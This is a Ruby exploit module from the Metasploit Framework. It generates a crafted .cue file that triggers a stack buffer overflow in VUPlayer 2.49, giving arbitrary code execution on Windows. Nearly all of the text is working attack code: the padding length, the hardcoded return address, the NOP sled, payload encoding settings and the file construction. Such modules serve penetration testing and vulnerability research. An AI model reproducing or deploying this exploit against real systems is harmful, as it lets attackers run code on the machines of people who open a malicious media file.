##
# $Id: vuplayer_cue.rb 10998 2010-11-11 22:43:22Z jduck $
##

##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
	Rank = GoodRanking

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'VUPlayer CUE Buffer Overflow',
			'Description'    => %q{
					This module exploits a stack over flow in VUPlayer <= 2.49. When
				the application is used to open a specially crafted cue file, an buffer is overwritten allowing
				for the execution of arbitrary code.
			},
			'License'        => MSF_LICENSE,
			'Author'         => [ 'MC' ],
			'Version'        => '$Revision: 10998 $',
			'References'     =>
				[
					[ 'OSVDB', '64581'],
					[ 'BID', '33960' ],
				],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'process',
					'DisablePayloadHandler' => 'true',
				},
			'Payload'        =>
				{
					'Space'    => 750,
					'BadChars' => "\x00",
					'EncoderType'   => Msf::Encoder::Type::AlphanumUpper,
					'DisableNops'  =>  'True',
				},
			'Platform' => 'win',
			'Targets'        =>
				[
					[ 'VUPlayer 2.49', { 'Ret' => 0x1010539f } ],
				],
			'Privileged'     => false,
			'DisclosureDate' => 'Aug 18 2009',
			'DefaultTarget'  => 0))

		register_options(
			[
				OptString.new('FILENAME',   [ false, 'The file name.',  'msf.cue']),
			], self.class)

	end

	def exploit

		sploit =  rand_text_alpha_upper(1012)
		sploit << [target.ret].pack('V')
		sploit << "\x90" * 12
		sploit << payload.encoded

		cue =  "FILE ""\""
		cue << sploit
		cue << ".BIN""\"" + " BINARY\r\n"
		cue << "TRACK 01 MODE1/22352\r\n"
		cue << "INDEX 01 00:00:00\r\n"

		print_status("Creating '#{datastore['FILENAME']}' file ...")

		file_create(cue)

	end

end